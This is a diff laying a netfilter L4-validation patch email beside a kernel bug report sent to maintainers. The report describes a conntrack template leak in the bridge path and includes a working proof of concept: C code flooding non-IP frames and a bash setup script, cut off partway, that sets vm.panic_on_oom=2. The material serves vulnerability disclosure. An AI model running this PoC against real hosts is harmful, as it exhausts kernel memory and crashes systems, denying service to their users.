@@ -1,80 +1,81 @@
-Received: from mail-qt1-f174.google.com (mail-qt1-f174.google.com [209.85.160.174])
+Received: from mail-pz2-f1.google.com (mail-pz2-f1.google.com [74.125.228.1])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DEBDB1FF1DA
-	for <netfilter-devel@vger.kernel.org>; Fri, 31 Jul 2026 03:48:57 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.160.174
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 039BD3546F4
+	for <netfilter-devel@vger.kernel.org>; Fri, 31 Jul 2026 06:37:07 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.1
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785469739; cv=none; b=lrS8g5ONw8qNp55OEPpivg+xwDQBjV3qvMr06NnkjuU4450Y6cKkXfyHc1HCSg5S0DdWZACXeNdffi9xfn6WunELck+9Sx3/kHBJEFMepZbnbk6a9eiZyIG9hrHvQT/0bSkOi0G6aDve0AlJxm6JwKvrerHbu3LAbtRDSMKUL6E=
+	t=1785479829; cv=none; b=GHe1NTHcVbeQlNMk1XRxlAPZ9tPCo1DjFRKNhFWpZxowm1BoJ2WrZnZ7K4c+Ze9t1zk15TsZPWl3SMOZ2FVoQOQ8+Cy8J52RXErFfEGr5GxVYZlJGq/X6Xgsha5M3l8eu13jopJ38E7uhZBLI6rfzTAb/ATQb4l3CDKwSSi+6Vg=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785469739; c=relaxed/simple;
-	bh=IQ0I5VjcNpiqCKQoL2x56gOH91oOkEopEEVn9lwvXwA=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=psMzf2Lh29dr1b1rEbgBxWyrPmAwzpwqTHTEos+W4VC22JZ8/t3osHmcnWbZBI+B4JVv4FTvNCChy3ASY7GNchkKkyWLTdud3Ii13AT7/RZzS0y2ZIfT9tLTX3CZGAPBwTu+AInO4tYHVe66aD1c1EaTffHT44qN7DCRC5tk4VE=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=QKD3e1+4; arc=none smtp.client-ip=209.85.160.174
+	s=arc-20240116; t=1785479829; c=relaxed/simple;
+	bh=s4pDVNKqKiJk4G+c0MMQo6wC6EPGJQu3YqGihkRDQ08=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=aso+RKRqAT1V1mKpkPcf9FEdbS8sLT8dkxrQx/F4wf2KQ0stu95cRCp/pTgMXNzUWVnagZ/4WOrEB6iYM/+3ch8U5UjPiLpQj5/e4wq01P1GzLOUxJsNklJ/obxwl3mJDk8Rd3eM8sWzHLiWl3hksClrkC14yUE/lv3SX0Sy3xE=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=oJK5IzxK; arc=none smtp.client-ip=74.125.228.1
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="QKD3e1+4"
-Received: by mail-qt1-f174.google.com with SMTP id d75a77b69052e-51c1372f84dso2606241cf.2
-        for <netfilter-devel@vger.kernel.org>; Thu, 30 Jul 2026 20:48:57 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="oJK5IzxK"
+Received: by mail-pz2-f1.google.com with SMTP id 41be03b00d2f7-c9fcd903839so345705a12.1
+        for <netfilter-devel@vger.kernel.org>; Thu, 30 Jul 2026 23:37:07 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1785469737; x=1786074537; darn=vger.kernel.org;
+        d=nebusec.ai; s=google; t=1785479827; x=1786084627; darn=vger.kernel.org;
         h=content-transfer-encoding:mime-version:message-id:date:subject:cc
          :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=6a/qznT3e9ePhKTa4f6oZcZAWMKMKr+HbsCDrncY3d8=;
-        b=QKD3e1+4GvbL2otOhatvRTemVsdCeqAZ80FA4/wE5spiaZBF/apPrL6yO16uXaEUDF
-         6fiGrjnkr+k7CjXIe4gOP3UMqaCnXEUSyO6As/pDJ55CZFDZhyXQxijqrVlNch5j2j97
-         KoOdICZpx6PdkFshHduewh5QVM2LSrHbsN0Y42pfv3w9/Wyz9labS/q97jLrWioJpZL2
-         97GSbQSPx6aHVxJWWvV5clgLLxugePOQAPrHEZTkNJ9Puu+jTdlvbqSBn0S+9X3R90Qu
-         ozKPsGfY1tEV3XHjOw5EFBcaREfWuBgwNz5DWZMybLR5+ymvUUUVWur01UGDFD8hr3nc
-         1KTQ==
+        bh=Yy7fkwWkkFUoC/alRV/ujwHTJ1l1BB4QsbRaiT9RzSw=;
+        b=oJK5IzxK0xyGJJQqNKscEJSwTbskUYp2Cm9VY64vrxokuVxQ8wNvZjTKZsur9CZcDZ
+         ayneHWUn3Z/i2WBpS8/GVYSKXhkquS7fnY24E4EHhwrPHMrmAzJBu2GwWMVXysI76U7+
+         KebZSh6U+pUHEiC+tY9cyaAIyguuqxdA19WIBmsWCGxDiXCiuxPeZE+PG5SKp9EvLQ1J
+         3BUaQAWzD4ZfePnK39nmc0iaakc2W/gFjpc/VK3oHyyECM8qOM1KeELNESvx2wNgBqxm
+         T9uxNWmFbq7zw0SoLgn3UBR+PdMoEvkw64zkQCsnqAL3j2WEIaVuOeI32v36Ocvsy/xQ
+         p2Yg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785469737; x=1786074537;
+        d=1e100.net; s=20251104; t=1785479827; x=1786084627;
         h=content-transfer-encoding:mime-version:message-id:date:subject:cc
          :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=6a/qznT3e9ePhKTa4f6oZcZAWMKMKr+HbsCDrncY3d8=;
-        b=Jd29O+jgxi3buQRNVgtzXyKTChgXWP2qARGLsLqkfYFcxRX5f7VKzld5upMv6rv23E
-         Z/MygRQJSR6tLic85+Wpu+lIWMUHqIoLVgxVYhCLGINtdZ1Lvc6X7Y7lzFrovLcx1fUN
-         XH4/rG7V6GvtQK1BxfC+CZtNCw3b4cxUyY2LQseda3Gx1xThef9brn58F+MIxPFKjgDU
-         bxNEDcLf0m4o2KYlt1wRHLd7o5w/XD2ehZjq8zst2uBkIKWX729/nUYjgYAR73pFYGP+
-         p9uwOZgTgrBKsdl2l52I7M15x2wRya9fWBgsabcNFd/zdjeZgNl0lbQW8xBzrV3yGgBA
-         Dl/g==
-X-Forwarded-Encrypted: i=1; AHgh+Rog3lINoTrqBl13/cNKRAkPXB1qMzV5mllsCI4uazxFZg7aZ+yPNI34FN9nJu3pkD5gyaQDbW8rLKRNRra9FUE=@vger.kernel.org
-X-Gm-Message-State: AOJu0Yynvm3uN5mA3WvTSp267a5rcAW4mSN5/8F8pVlWmZ+vScl33SFt
-	c/TY1PsmEna0japoY3yE6sp5lO2Uvzg+imUPK+pMkFR56leW4LEMknjuw0O6mFFAAk3Q
-X-Gm-Gg: AR+sD10ivzbuTVGqqrHk7CtvgqPYkrhFdieY1+lzllDTE2Bzbl7Y07vHouUCAyqawrK
-	6tsGGxh0pWnjURNUQ8iRHOEoSCO1qWmT2HIrb+7dF6C58+gJGl00X3umVJwWqYUtIR8DSU5Rtrs
-	QdDgm3ALhTU2tJS/b50IH3fQvzjYRdVOz0Fg43I7aOCgXjSnp0QIDMxzCk+k/P0HWk5TLgs0sld
-	tqdUSOnqo1cm+k7dm2GSDal/QIUS2ywD1TLoLxHoGiNCxqEAVybshwc8SRJli1l+QOKnHIt1qGL
-	9F9zoOT/7cTQpedMsgYOICx1AQMWSXFbgLcwio/J9hqRlW6IceddLIDk5i/RERC9YEZ457NNJPX
-	X15SsO8kWD2TJ/4XKwgz/OCVFgQMk9YEDm7iWyWvrASow36eJsJsvtH9dqQS6ZhFJ9wUlfjXUhE
-	uCqojRulvdSvi2aFXSFgj9FVERdO4RoWij2snwd/OFLf3ANsiF64Qw0uSUkc0KJNvjFY9m4CV/j
-	8No
-X-Received: by 2002:ac8:610e:0:b0:527:f5af:9e7 with SMTP id d75a77b69052e-52b4b0cf824mr4916991cf.51.1785469736632;
-        Thu, 30 Jul 2026 20:48:56 -0700 (PDT)
+        bh=Yy7fkwWkkFUoC/alRV/ujwHTJ1l1BB4QsbRaiT9RzSw=;
+        b=EBX+yfx4wYExRkJ/+LHkPmrDcpxZkLxtIr0OKnu7BGH4MOYhtaWA/QGGYjoZr05qj9
+         blFYSZLhiREDprGtoKIZjuwdbK3pjTccXYVvgwQz3fd5P5I950FQ9Uowgnc2zEMMBiDi
+         Xu4xAY2A0UFyfcRq38iOITmyG0hBqlSh2B8wDLyhj/ITtV6qiHl4FBGZ9FaMXyFTSCJL
+         pIod0zmbq3c5KPpBAdO365ziMJmsRCh1c2RxBJGuWdte/B0iTlWtexsuTCxXcXCzLA8R
+         mYMdt1cXcndxX2zoV00ZudIbo4cI/rtIuWgvTpHoOvvhW0vixTeP50N1mbDu+FrNk5UR
+         OZgQ==
+X-Gm-Message-State: AOJu0YxgM6NVkvp3bBCcKS+y3/d6zODcmuDORB7lrE2WUshB45XTbBGy
+	tgHHlJSkk7/FL/4C+EBddDkDARRX5BYfmcu1/osxC/SgpXRx3r5/xLMBA1cidwqE64vnBU0QS3s
+	GvX2AUwdMJ5GIyw==
+X-Gm-Gg: AR+sD12r2yPMPf6sk0cuCaFkSMOdx9IvGLLCkOo8epFLbAB2CKEqopUYvdF48o0UUM6
+	+oRoYDPyfT0vVCgcRAK/BH1UtAMj38AaigzFPdZkh/omH7JADZTLz1C2WnTwEAHDYJzn5YJtWq4
+	jHIMW8RbZ+wp2s+JUiFD4SEYNxySCIt4EgvgoTdG0lqXqRcbV0hhG+CAakGaZNKOtvyQ0yiBd81
+	Gxwdc5yzZn+sL6Dio9+miDJVJ31Kf3l1nZViQCS3v1Kjc68gejB/DSDIf+Bm/NJ+FZoknspAPS4
+	fn0HUVz310bKmQQhHG0dy3AtDXUCjAg3wgyQE8Ref5WJks76pIFp+SbpaPfNLku6Djjojvld/Ce
+	+18xcm+aL6ncupFKaCCW1mL5mwMDkZjQcoypstCyVJvfqIn7cEmdAJ0WhiXYm5Dj2PLeSSXAs6a
+	24htFPsLt0ABjP00qPA8MrkpekpWmqautqAlKckaNw+B0DMtDgSweubMncOUhZxJ0TtaJ12baj+
+	ns1
+X-Received: by 2002:a05:6a00:2e93:b0:84e:d51d:86cd with SMTP id d2e1a72fcca58-84ed7153224mr759089b3a.45.1785479827044;
+        Thu, 30 Jul 2026 23:37:07 -0700 (PDT)
 Received: from Roxy.localdomain ([203.175.14.58])
-        by smtp.gmail.com with ESMTPSA id d75a77b69052e-52b4ebeb909sm266761cf.29.2026.07.30.20.48.50
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84edc2d7b97sm6102b3a.43.2026.07.30.23.37.02
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 30 Jul 2026 20:48:54 -0700 (PDT)
+        Thu, 30 Jul 2026 23:37:05 -0700 (PDT)
 From: Zhiling Zou <zhilinz@nebusec.ai>
-To: pablo@netfilter.org,
-	fw@strlen.de,
-	netfilter-devel@vger.kernel.org,
+To: netfilter-devel@vger.kernel.org,
+	bridge@lists.linux.dev,
 	netdev@vger.kernel.org
-Cc: phil@nwl.cc,
+Cc: pablo@netfilter.org,
+	fw@strlen.de,
+	phil@nwl.cc,
+	razor@blackwall.org,
+	idosch@nvidia.com,
 	davem@davemloft.net,
 	edumazet@google.com,
 	kuba@kernel.org,
 	pabeni@redhat.com,
 	horms@kernel.org,
-	kaber@trash.net,
-	zhaojignmin@hotmail.com,
 	vega@nebusec.ai,
 	zhilinz@nebusec.ai
-Subject: [PATCH nf v3 1/1] netfilter: validate L4 headers after userspace packet writes
-Date: Fri, 31 Jul 2026 11:48:42 +0800
-Message-ID: <587830a57a593c4b621f7e8e94b2ddc73e6becb0.1785468829.git.zhilinz@nebusec.ai>
+Subject: [PATCH nf 0/1] netfilter: bridge: release template ct on non-IP path
+Date: Fri, 31 Jul 2026 14:36:52 +0800
+Message-ID: <cover.1785479514.git.zhilinz@nebusec.ai>
 X-Mailer: git-send-email 2.43.0
 Precedence: bulk
 X-Mailing-List: netfilter-devel@vger.kernel.org
@@ -84,183 +85,446 @@ List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-NFQUEUE and nft_payload can hand packet data modified by userspace back
-to the stack. Recent restrictions keep link and network headers stable,
-but transport header fields can still be changed.
+Hi Linux kernel maintainers,
 
-A packet can therefore keep the same network header and conntrack entry
-while changing the transport header layout. For TCP, increasing doff can
-make later helper or NAT code use a different transport-header base than
-the parser used, and can make offsets point past skb->tail.
+We found and validated an issue in
+net/bridge/netfilter/nf_conntrack_bridge.c. The bug is reachable by a
+non-root user via user and net namespace.
 
-Extend NFQUEUE payload validation to check the final L4 protocol and
-known base headers after IPv4 options or IPv6 extension headers. Reject
-packets whose L4 protocol no longer matches an attached non-template
-conntrack entry, and validate TCP data offset before reinjection. Unknown
-L4 protocols are left to their normal protocol handlers.
+We've built the fix locally, and it should not affect normal
+functionality.
 
-For nft payload writes, reject transport-header stores that overlap TCP
-doff. nft_nh_write_ok() already rejects network-header protocol changes,
-so keeping doff stable prevents nft payload writes from changing the TCP
-header length underneath conntrack and helper users.
+We will provide detailed information about the bug in this email, along
+with a PoC to trigger it.
 
-Fixes: 5e35941d9901 ("[NETFILTER]: Add H.323 conntrack/NAT helper")
-Cc: stable@vger.kernel.org
-Reported-by: Vega <vega@nebusec.ai>
-Signed-off-by: Zhiling Zou <zhilinz@nebusec.ai>
----
-changes in v3:
-- Allow unknown L4 protocols in NFQUEUE payload validation.
-- Add explicit AH and ESP minimum base-header validation.
-- v2 Link: https://lore.kernel.org/all/f0efaa7d67a580488fc5e32a09683c992db35742.1785392716.git.zhilinz@nebusec.ai
+---- details below ----
 
-changes in v2:
-- Replace the H.323-specific NAT/helper-only fix with generic validation
-  for userspace packet writes.
-- Validate NFQUEUE payload replacements after IPv4 option and IPv6
-  extension-header validation, including TCP data offset and attached
-  non-template conntrack L4 protocol consistency.
-- Reject nft_payload transport-header writes that overlap TCP doff.
-- v1 Link: https://lore.kernel.org/all/68faab5bf406aad612233e76994c649fbc547b8d.1785133455.git.zhilinz@nebusec.ai
+Bug details:
 
- net/netfilter/nfnetlink_queue.c | 61 +++++++++++++++++++++++++++++++--
- net/netfilter/nft_payload.c     | 13 +++++++
- 2 files changed, 71 insertions(+), 3 deletions(-)
+A bridge nftables ct zone set rule can attach a conntrack template to an
+skb before nf_ct_bridge_pre() sees it. For non-IPv4 and non-IPv6
+EtherTypes, nf_ct_bridge_pre() marks the frame untracked without first
+dropping the existing template reference.
 
-diff --git a/net/netfilter/nfnetlink_queue.c b/net/netfilter/nfnetlink_queue.c
-index b8aaf39cb4d8e..5c29a4428b6eb 100644
---- a/net/netfilter/nfnetlink_queue.c
-+++ b/net/netfilter/nfnetlink_queue.c
-@@ -28,10 +28,17 @@
- #include <linux/netfilter/nfnetlink.h>
- #include <linux/netfilter/nfnetlink_queue.h>
- #include <linux/netfilter/nf_conntrack_common.h>
-+#include <linux/icmp.h>
-+#include <linux/icmpv6.h>
-+#include <linux/ip.h>
- #include <linux/list.h>
-+#include <linux/sctp.h>
- #include <linux/cgroup-defs.h>
- #include <linux/rhashtable.h>
- #include <linux/jhash.h>
-+#include <linux/tcp.h>
-+#include <linux/udp.h>
-+#include <net/gre.h>
- #include <net/gso.h>
- #include <net/sock.h>
- #include <net/tcp_states.h>
-@@ -1206,6 +1213,51 @@ static bool nfqnl_validate_ipopts(const struct iphdr *iph_new,
- 	return memcmp(iph_new + 1, ip_hdr(e->skb) + 1, ihl - sizeof(*iph_orig)) == 0;
- }
- 
-+static bool nfqnl_validate_l4(const u8 *data, unsigned int data_len,
-+			      const struct nf_queue_entry *e, u8 proto)
-+{
-+#if IS_ENABLED(CONFIG_NF_CONNTRACK)
-+	enum ip_conntrack_info ctinfo;
-+	const struct nf_conn *ct;
-+
-+	ct = nf_ct_get(e->skb, &ctinfo);
-+	if (ct && !nf_ct_is_template(ct) && nf_ct_protonum(ct) != proto)
-+		return false;
-+#endif
-+
-+	switch (proto) {
-+	case IPPROTO_TCP: {
-+		const struct tcphdr *th = (const struct tcphdr *)data;
-+		unsigned int thlen;
-+
-+		if (data_len < sizeof(*th))
-+			return false;
-+
-+		thlen = __tcp_hdrlen(th);
-+		if (thlen < sizeof(*th) || data_len < thlen)
-+			return false;
-+
-+		return true;
-+	}
-+	case IPPROTO_UDP:
-+		return data_len >= sizeof(struct udphdr);
-+	case IPPROTO_ICMP:
-+		return data_len >= sizeof(struct icmphdr);
-+	case IPPROTO_ICMPV6:
-+		return data_len >= sizeof(struct icmp6hdr);
-+	case IPPROTO_SCTP:
-+		return data_len >= sizeof(struct sctphdr);
-+	case IPPROTO_GRE:
-+		return data_len >= sizeof(struct gre_base_hdr);
-+	case IPPROTO_AH:
-+		return data_len >= sizeof(struct ip_auth_hdr);
-+	case IPPROTO_ESP:
-+		return data_len >= sizeof(struct ip_esp_hdr);
-+	}
-+
-+	return true;
-+}
-+
- static bool nfqnl_validate_ip4(const struct iphdr *iph, unsigned int data_len,
- 			       const struct nf_queue_entry *e)
- {
-@@ -1229,7 +1281,9 @@ static bool nfqnl_validate_ip4(const struct iphdr *iph, unsigned int data_len,
- 	/* support for ipopts mangling would require
- 	 * recompile + skb transport header update.
- 	 */
--	return nfqnl_validate_ipopts(iph, e);
-+	return nfqnl_validate_ipopts(iph, e) &&
-+	       nfqnl_validate_l4((const u8 *)iph + ihl, data_len - ihl, e,
-+				 iph->protocol);
- }
- 
- static bool nfqnl_validate_one_exthdr(const u8 *data,
-@@ -1286,7 +1340,8 @@ static bool nfqnl_validate_exthdr(const struct ipv6hdr *ip6_new,
- 		int hdrlen;
- 
- 		if (orig_nexthdr == NEXTHDR_NONE)
--			return true;
-+			return nfqnl_validate_l4(data, data_len, e,
-+						 new_nexthdr);
- 
- 		if (unlikely(exthdr_cnt++ >= IP6_MAX_EXT_HDRS_CNT))
- 			return false;
-@@ -1323,7 +1378,7 @@ static bool nfqnl_validate_exthdr(const struct ipv6hdr *ip6_new,
- 		data += hdrlen;
- 	}
- 
--	return true;
-+	return nfqnl_validate_l4(data, data_len, e, new_nexthdr);
- }
- 
- static bool nfqnl_validate_ip6(const struct ipv6hdr *ip6, unsigned int data_len,
-diff --git a/net/netfilter/nft_payload.c b/net/netfilter/nft_payload.c
-index 8a4472fd77d9f..e315d35f73d4a 100644
---- a/net/netfilter/nft_payload.c
-+++ b/net/netfilter/nft_payload.c
-@@ -1067,6 +1067,17 @@ static bool nft_payload_csum_write_ok(const struct nft_pktinfo *pkt,
- 	return false;
- }
- 
-+static bool nft_th_write_ok(const struct nft_pktinfo *pkt,
-+			    const struct nft_payload_set *priv)
-+{
-+	unsigned int doff = offsetof(struct tcphdr, ack_seq) + sizeof(__be32);
-+
-+	if (pkt->tprot != IPPROTO_TCP)
-+		return true;
-+
-+	return priv->offset > doff || priv->offset + priv->len <= doff;
-+}
-+
- static void nft_payload_set_eval(const struct nft_expr *expr,
- 				 struct nft_regs *regs,
- 				 const struct nft_pktinfo *pkt)
-@@ -1105,6 +1116,8 @@ static void nft_payload_set_eval(const struct nft_expr *expr,
- 	case NFT_PAYLOAD_TRANSPORT_HEADER:
- 		if (!(pkt->flags & NFT_PKTINFO_L4PROTO) || pkt->fragoff)
- 			goto err;
-+		if (!nft_th_write_ok(pkt, priv))
-+			goto err;
- 		offset = nft_thoff(pkt);
- 		break;
- 	case NFT_PAYLOAD_INNER_HEADER:
+That makes the per-cpu template, and any temporary templates allocated
+for concurrent use, unreachable. Repeated non-IP bridge traffic can
+therefore leak unreclaimable slab memory until the host hits OOM.
+
+Reproducer:
+
+    make
+    chmod +x poc.sh
+    THREADS=4 ./poc.sh
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+// SPDX-License-Identifier: MIT
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <net/if.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdatomic.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
+
+struct worker_cfg {
+	int ifindex;
+	int cpu;
+	uint16_t ethertype;
+};
+
+static volatile sig_atomic_t stop_flag;
+static atomic_ullong total_sent;
+
+static void handle_signal(int sig)
+{
+	(void)sig;
+	stop_flag = 1;
+}
+
+static unsigned int online_cpus(void)
+{
+	long n = sysconf(_SC_NPROCESSORS_ONLN);
+
+	return n > 0 ? (unsigned int)n : 1U;
+}
+
+static int pin_to_cpu(int cpu)
+{
+	cpu_set_t set;
+
+	CPU_ZERO(&set);
+	CPU_SET(cpu, &set);
+	return pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
+}
+
+static void build_frame(unsigned char *frame, size_t len, int cpu, uint16_t ethertype)
+{
+	size_t i;
+
+	memset(frame, 0, len);
+	memset(frame, 0xff, ETH_ALEN);
+	frame[6] = 0x02;
+	frame[7] = 0x11;
+	frame[8] = 0x22;
+	frame[9] = 0x33;
+	frame[10] = 0x44;
+	frame[11] = (unsigned char)cpu;
+	frame[12] = (unsigned char)(ethertype >> 8);
+	frame[13] = (unsigned char)(ethertype & 0xff);
+
+	for (i = ETH_HLEN; i < len; i++)
+		frame[i] = (unsigned char)(cpu + i);
+}
+
+static void *worker(void *arg)
+{
+	static const size_t frame_len = ETH_ZLEN;
+	struct worker_cfg *cfg = arg;
+	struct sockaddr_ll sll = {
+		.sll_family = AF_PACKET,
+		.sll_ifindex = cfg->ifindex,
+		.sll_halen = ETH_ALEN,
+		.sll_protocol = htons(cfg->ethertype),
+	};
+	unsigned char frame[ETH_ZLEN];
+	uint64_t local = 0;
+	int fd;
+	int one = 1;
+
+	memset(sll.sll_addr, 0xff, ETH_ALEN);
+	build_frame(frame, sizeof(frame), cfg->cpu, cfg->ethertype);
+
+	fd = socket(AF_PACKET, SOCK_RAW, htons(cfg->ethertype));
+	if (fd < 0) {
+		perror("socket(AF_PACKET)");
+		return NULL;
+	}
+
+	(void)setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
+	(void)pin_to_cpu(cfg->cpu);
+
+	while (!stop_flag) {
+		ssize_t ret;
+
+		ret = sendto(fd, frame, frame_len, 0, (struct sockaddr *)&sll,
+			     sizeof(sll));
+		if (ret == (ssize_t)frame_len) {
+			local++;
+			if ((local & ((1U << 12) - 1)) == 0)
+				atomic_fetch_add_explicit(&total_sent, 1U << 12,
+							  memory_order_relaxed);
+			continue;
+		}
+
+		if (ret < 0 &&
+		    (errno == EINTR || errno == ENOBUFS || errno == EBUSY ||
+		     errno == ENETDOWN || errno == ENXIO))
+			continue;
+
+		if (ret < 0)
+			perror("sendto");
+		break;
+	}
+
+	if (local & ((1U << 12) - 1))
+		atomic_fetch_add_explicit(&total_sent,
+					  local & ((1U << 12) - 1),
+					  memory_order_relaxed);
+	close(fd);
+	return NULL;
+}
+
+static unsigned long parse_ul(const char *s, unsigned long defval, int base)
+{
+	char *end = NULL;
+	unsigned long v;
+
+	if (!s)
+		return defval;
+
+	errno = 0;
+	v = strtoul(s, &end, base);
+	if (errno || !end || *end != '\0')
+		return defval;
+
+	return v;
+}
+
+static void usage(const char *prog)
+{
+	fprintf(stderr,
+		"Usage: %s <ifname> [threads] [ethertype] [seconds]\n"
+		"Defaults: threads=<online cpus>, ethertype=0x88b5, seconds=0 (run until killed)\n",
+		prog);
+}
+
+int main(int argc, char **argv)
+{
+	struct sigaction sa = { .sa_handler = handle_signal };
+	const char *ifname;
+	unsigned int threads;
+	unsigned int i;
+	unsigned long seconds;
+	uint16_t ethertype;
+	int ifindex;
+	pthread_t *tids;
+	struct worker_cfg *cfgs;
+	time_t start;
+
+	if (argc < 2) {
+		usage(argv[0]);
+		return 1;
+	}
+
+	ifname = argv[1];
+	ifindex = if_nametoindex(ifname);
+	if (!ifindex) {
+		perror("if_nametoindex");
+		return 1;
+	}
+
+	threads = (unsigned int)parse_ul(argv[2], online_cpus(), 10);
+	if (!threads)
+		threads = 1;
+
+	ethertype = (uint16_t)parse_ul(argv[3], 0x88b5, 0);
+	seconds = parse_ul(argv[4], 0, 10);
+
+	tids = calloc(threads, sizeof(*tids));
+	cfgs = calloc(threads, sizeof(*cfgs));
+	if (!tids || !cfgs) {
+		perror("calloc");
+		free(tids);
+		free(cfgs);
+		return 1;
+	}
+
+	sigemptyset(&sa.sa_mask);
+	sa.sa_flags = 0;
+	if (sigaction(SIGINT, &sa, NULL) || sigaction(SIGTERM, &sa, NULL)) {
+		perror("sigaction");
+		free(tids);
+		free(cfgs);
+		return 1;
+	}
+
+	start = time(NULL);
+	fprintf(stderr,
+		"Starting sender on %s (ifindex=%d), threads=%u, ethertype=0x%04x, seconds=%lu\n",
+		ifname, ifindex, threads, ethertype, seconds);
+
+	for (i = 0; i < threads; i++) {
+		cfgs[i].ifindex = ifindex;
+		cfgs[i].cpu = (int)(i % online_cpus());
+		cfgs[i].ethertype = ethertype;
+		if (pthread_create(&tids[i], NULL, worker, &cfgs[i]) != 0) {
+			perror("pthread_create");
+			stop_flag = 1;
+			threads = i;
+			break;
+		}
+	}
+
+	while (!stop_flag) {
+		sleep(1);
+		fprintf(stderr, "elapsed=%lds total_sent=%llu\n",
+			(long)(time(NULL) - start),
+			(unsigned long long)atomic_load_explicit(&total_sent,
+							      memory_order_relaxed));
+		if (seconds && (unsigned long)(time(NULL) - start) >= seconds)
+			stop_flag = 1;
+	}
+
+	for (i = 0; i < threads; i++)
+		pthread_join(tids[i], NULL);
+
+	fprintf(stderr, "final total_sent=%llu\n",
+		(unsigned long long)atomic_load_explicit(&total_sent,
+						      memory_order_relaxed));
+	free(tids);
+	free(cfgs);
+	return 0;
+}
+
+------END poc.c--------
+
+------BEGIN poc.sh------
+
+#!/bin/bash
+set -euo pipefail
+
+THREADS="${THREADS:-$(nproc)}"
+ETHERTYPE="${ETHERTYPE:-0x88b5}"
+SECONDS_TO_RUN="${SECONDS_TO_RUN:-0}"
+BR_DEV="${BR_DEV:-br_ctleak}"
+BR_PORT="${BR_PORT:-vport0}"
+INJECT_DEV="${INJECT_DEV:-inj0}"
+NFT_TABLE="${NFT_TABLE:-ctleak}"
+
+cleanup() {
+	set +e
+	if [[ -n "${MONITOR_PID:-}" ]]; then
+		kill "${MONITOR_PID}" 2>/dev/null
+		wait "${MONITOR_PID}" 2>/dev/null
+	fi
+	nft delete table bridge "${NFT_TABLE}" 2>/dev/null
+	ip link del "${BR_PORT}" 2>/dev/null
+	ip link del "${INJECT_DEV}" 2>/dev/null
+	ip link del "${BR_DEV}" 2>/dev/null
+}
+
+monitor() {
+	while true; do
+		awk '
+			/^(MemAvailable|Slab|SReclaimable|SUnreclaim):/ {
+				printf "%s=%s%s ", $1, $2, $3
+			}
+			$1 == "nf_conntrack" {
+				printf "nf_conntrack_active=%s nf_conntrack_total=%s objsize=%s\n",
+				       $2, $3, $4
+			}
+		' /proc/meminfo /proc/slabinfo
+		sleep 1
+	done
+}
+
+if [[ "$(id -u)" -ne 0 ]]; then
+	echo "Run as root." >&2
+	exit 1
+fi
+
+trap cleanup EXIT
+
+sysctl -q -w kernel.panic_on_warn=0
+sysctl -q -w vm.panic_on_oom=2
+
+nft delete table bridge "${NFT_TABLE}" 2>/dev/null || true
+ip link del "${BR_PORT}" 2>/dev/null || true
+ip link del "${INJECT_DEV}" 2>/dev/null || true
+ip link del "${BR_DEV}" 2>/dev/null || true
+
+ip link add "${BR_DEV}" type bridge
+ip link add "${BR_PORT}" type veth peer name "${INJECT_DEV}"
+ip link set "${BR_PORT}" master "${BR_DEV}"
+ip link set "${BR_DEV}" up
+ip link set "${BR_PORT}" up
+ip link set "${INJECT_DEV}" up
+
+nft add table bridge "${NFT_TABLE}"
+nft "add chain bridge ${NFT_TABLE} preraw { type filter hook prerouting priority -300; policy accept; }"
+nft "add rule bridge ${NFT_TABLE} preraw ct zone set 1"
+
+echo "Bridge ruleset:"
+nft list table bridge "${NFT_TABLE}"
+echo "Initial nf_conntrack slab:"
+grep '^nf_conntrack ' /proc/slabinfo || true
+
+monitor &
+MONITOR_PID=$!
+
+if [[ ! -x ./poc ]]; then
+	make
+fi
+
